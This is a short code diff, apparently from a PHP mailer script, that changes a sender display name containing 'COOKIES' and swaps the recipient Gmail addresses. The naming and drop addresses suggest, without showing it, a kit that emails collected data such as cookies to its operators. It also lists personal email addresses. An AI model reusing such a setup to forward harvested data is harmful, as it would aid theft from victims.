@@ -35,8 +35,8 @@ try {
 
 
         // Email properties
-        $mail->setFrom('Saba.yg.for@gmail.com', 'WASEEM COOKIES');
-        $mail->addAddress('welsaoalspid@gmail.com');
+        $mail->setFrom('Saba.yg.for@gmail.com', 'younisCOOKIES');
+        $mail->addAddress('younisghaliya@gmail.com');
        $mail->addAddress('Lernayouamzaxal@gmail.com');
 
 
